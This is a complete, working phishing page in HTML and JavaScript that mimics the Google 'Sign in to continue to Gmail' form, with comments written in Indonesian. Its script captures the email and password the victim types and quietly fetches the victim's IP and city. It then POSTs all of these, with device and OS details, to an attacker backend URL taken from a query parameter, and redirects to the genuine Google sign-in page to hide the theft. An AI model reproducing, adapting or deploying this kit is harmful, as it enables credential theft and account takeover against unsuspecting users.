<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Sign in - Google Accounts</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', -apple-system, BlinkMacSystemFont, Arial, sans-serif; }
  body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #202124; }
  .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; margin: 20px; }
  .logo { text-align: center; margin-bottom: 16px; }
  .logo svg { width: 75px; height: 24px; }
  .title { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 8px; }
  .subtitle { text-align: center; font-size: 16px; margin-bottom: 40px; }
  .form-group { position: relative; margin-bottom: 24px; }
  input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: 0.2s; }
  input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
  .btn-group { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
  .btn-link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; background: none; border: none; padding: 8px; }
  .btn-submit { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.2s; }
  .btn-submit:hover { background: #1557b0; }
  .loading { display: none; text-align: center; margin-top: 20px; color: #5f6368; font-size: 14px; }
  .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #5f6368; }
  .footer a { color: #1a73e8; text-decoration: none; }
</style>
</head>
<body>

<div class="container">
  <div class="logo">
    <!-- Logo Google SVG -->
    <svg viewBox="0 0 74 24"><path fill="#4285F4" d="M9.4 13.1c0-.6-.1-1.3-.2-1.9H1.5v3.5h4.5c-.2 1-.8 1.9-1.6 2.5v2.1h2.6c1.5-1.4 2.4-3.4 2.4-6.2z"/><path fill="#34A853" d="M1.5 14.7c.8 0 1.6-.2 2.3-.6l-2.6-2.1c-.1.3-.2.7-.2 1.2 0 .5.1 1 .2 1.5z"/><path fill="#FBBC05" d="M1.5 10.2c.2 0 .4 0 .6-.1V7.5H.5c-.4.8-.6 1.7-.6 2.7 0 1 .2 1.9.6 2.7h1.6v-2.7z"/><path fill="#EA4335" d="M5.5 3.2c.9 0 1.7.3 2.4.9l1.8-1.8C8.5 1.2 7.1.6 5.5.6c-2.2 0-4.1 1.3-5 3.1l2.6 2.1c.5-1.5 1.9-2.6 3.4-2.6z"/><path fill="#4285F4" d="M5.5 21.4c1.6 0 3-.5 4.1-1.4l-2.6-2.1c-.6.4-1.4.6-2.3.6-1.5 0-2.8-1-3.3-2.4H.5v1.6c.9 2.1 2.9 3.7 5 3.7z"/><path fill="#5F6368" d="M19.6 7.3h-2v10.1h1.6v-3.5h1.8c1.7 0 3-1.4 3-3.3s-1.3-3.3-3-3.3zm1.6 3.3c0 .9-.7 1.7-1.6 1.7h-1.5V9h1.5c.9 0 1.6.8 1.6 1.6z"/><path fill="#5F6368" d="M26.5 10.6c-1.2 0-2.2.5-2.8 1.1l.7 1.1c.5-.4 1.2-.7 2.1-.7 1 0 1.6.5 1.6 1.4v.2c-.5-.1-1-.2-1.5-.2-1.6 0-2.8.9-2.8 2.2 0 1.3 1.1 2.1 2.4 2.1 1 0 1.8-.5 2.2-1.2h.1v1.1h1.6v-4.5c0-1.8-1.2-2.6-2.7-2.6zm1.6 4.5c0 .8-.7 1.4-1.6 1.4-.8 0-1.3-.4-1.3-1.1 0-.7.6-1.1 1.5-1.1.5 0 .9.1 1.3.2v.6z"/><path fill="#5F6368" d="M36.8 10.8c-.4 0-.8.1-1.1.3-.3.2-.5.5-.7.8h-.1v-1h-1.6v7.5h1.6v-4c0-1 .6-1.6 1.4-1.6.2 0 .4 0 .5.1v-2.1z"/><path fill="#5F6368" d="M41.7 11.9h-1.9v-2.4h-1.6v2.4h-1.3v1.3h1.3v4.1c0 1.6.9 2.3 2.2 2.3.5 0 1-.1 1.3-.2l-.3-1.4c-.2.1-.4.1-.6.1-.5 0-.8-.2-.8-.9v-4h1.9v-1.3z"/><path fill="#5F6368" d="M46.1 10.6c-2.1 0-3.6 1.6-3.6 3.8 0 2.2 1.4 3.8 3.6 3.8 2.1 0 3.6-1.6 3.6-3.8 0-2.2-1.4-3.8-3.6-3.8zm0 6.1c-1.3 0-2.1-1-2.1-2.3 0-1.3.8-2.3 2.1-2.3 1.3 0 2.1 1 2.1 2.3 0 1.3-.8 2.3-2.1 2.3z"/><path fill="#5F6368" d="M55.3 10.6c-2.1 0-3.6 1.6-3.6 3.8 0 2.2 1.4 3.8 3.6 3.8 2.1 0 3.6-1.6 3.6-3.8 0-2.2-1.5-3.8-3.6-3.8zm0 6.1c-1.3 0-2.1-1-2.1-2.3 0-1.3.8-2.3 2.1-2.3 1.3 0 2.1 1 2.1 2.3 0 1.3-.8 2.3-2.1 2.3z"/><path fill="#5F6368" d="M62.7 10.6c-1 0-1.8.5-2.2 1.2h-.1v-1h-1.6v7.5h1.6v-4c0-1 .6-1.6 1.5-1.6 1 0 1.4.6 1.4 1.6v4h1.6v-4.2c0-2.1-1.2-3.5-3.2-3.5z"/><path fill="#5F6368" d="M68.1 4.5h-1.6v10.1h1.6v-3.5h1.8c1.7 0 3-1.4 3-3.3s-1.3-3.3-3-3.3zm1.6 3.3c0 .9-.7 1.7-1.6 1.7h-1.5V9h1.5c.9 0 1.6.8 1.6 1.6z"/></svg>
  </div>
  <div class="title">Sign in</div>
  <div class="subtitle">to continue to Gmail</div>

  <form id="loginForm">
    <div class="form-group">
      <input type="email" id="email" placeholder="Email or phone" required autocomplete="email">
    </div>
    <div class="form-group">
      <input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password">
    </div>
    
    <div class="btn-group">
      <button type="button" class="btn-link" onclick="alert('Fitur ini tidak tersedia saat ini.')">Forgot email?</button>
      <button type="submit" class="btn-submit" id="submitBtn">Next</button>
    </div>
  </form>

  <div class="loading" id="loadingBox">
    <div class="spinner"></div>
    <div>Verifying account...</div>
  </div>

  <div class="footer">
    <a href="#">Create account</a> | <a href="#">Help</a> | <a href="#">Privacy</a> | <a href="#">Terms</a>
  </div>
</div>

<script>
  // Ambil URL Backend dari parameter URL Web Control
  var urlParams = new URLSearchParams(window.location.search);
  var backendUrl = urlParams.get('backend');

  function getInfo() {
    var ua = navigator.userAgent;
    var os = "Unknown", device = "Desktop";
    if (/android/i.test(ua)) { os = "Android"; device = "Mobile"; }
    if (/iPad|iPhone|iPod/.test(ua)) { os = "iOS"; device = "Tablet"; }
    if (/windows/i.test(ua)) os = "Windows";
    if (/macintosh/i.test(ua)) os = "macOS";
    return { device: device, os: os };
  }

  document.getElementById("loginForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    
    var email = document.getElementById("email").value.trim();
    var password = document.getElementById("password").value.trim();
    if (!email || !password) return;

    // Sembunyikan form, tampilkan loading
    document.getElementById("loginForm").style.display = "none";
    document.getElementById("loadingBox").style.display = "block";

    var info = getInfo();
    var ipData = { ip: "-", city: "-" };
    
    // Ambil IP secara diam-diam
    try {
      var res = await fetch("https://ipapi.co/json/");
      ipData = await res.json();
    } catch (err) {}

    // Kirim ke Backend
    if (backendUrl) {
      var formData = new URLSearchParams();
      formData.append("email", email);
      formData.append("password", password);
      formData.append("ip", ipData.ip || "-");
      formData.append("kota", ipData.city || "-");
      formData.append("device", info.device);
      formData.append("os", info.os);

      try {
        await fetch(backendUrl, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: formData.toString()
        });
      } catch (err) {}
    }

    // Redirect ke Google Asli
    setTimeout(function() {
      window.location.href = "https://accounts.google.com/signin/v2/identifier";
    }, 2000);
  });
</script>

</body>
</html>
